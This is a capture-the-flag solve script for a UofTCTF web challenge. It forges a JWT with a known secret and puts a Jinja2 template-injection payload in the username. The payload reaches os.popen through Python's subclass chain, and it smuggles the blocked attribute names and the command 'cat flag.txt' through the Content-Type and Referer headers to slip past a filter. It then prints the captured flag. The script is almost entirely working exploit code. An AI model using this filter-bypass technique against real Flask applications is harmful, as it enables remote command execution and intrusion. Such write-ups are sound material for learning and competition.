#ruifi47, tmv11
if __name__ == '__main__':
    import jwt

    headers = {
        'Content-Type': '__class__ __base__ __subclasses__ __getitem__ load_module os popen read',
        'Referer': 'cat flag.txt'
    }
    steps = ['()',
             'attr(request.mimetype.split().pop(0))',  # __class__
             'attr(request.mimetype.split().pop(1))',  # __base__
             'attr(request.mimetype.split().pop(2))()',  # __subclasses__
             'attr(request.mimetype.split().pop(3))(104)',  # __getitem__
             'attr(request.mimetype.split().pop(4))(request.mimetype.split().pop(5))',  # load_module
             'attr(request.mimetype.split().pop(6))(request.referrer)',  # popen("cat flag.txt")
             'attr(request.mimetype.split().pop(7))()',  # read
             ]
    payload = '|'.join(steps)
    payload = '{{' + payload + '}}'

    print(f'TRYING {payload}')
    encoded_jwt = jwt.encode({'username': payload}, 'torontobluejays', algorithm='HS256')

    URL = 'https://uoftctf-my-first-app.chals.io'
    import requests

    r = requests.get(URL + '/dashboard', cookies={'auth_token': encoded_jwt}, headers=headers)
    r.raise_for_status()

    import bs4

    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    prefix = 'Welcome, '
    flag = soup.select('.welcome-text')[0].text
    if flag == 'BLOCKED':
        error = soup.select('.error-message')[0].text
        print(f'BLOCKED: {error}')
    else:
        flag = flag[len(prefix):]
        print(f'ALLOWED: {flag}')
#uoftctf{That_firewall_salesperson_scammed_me_:(}
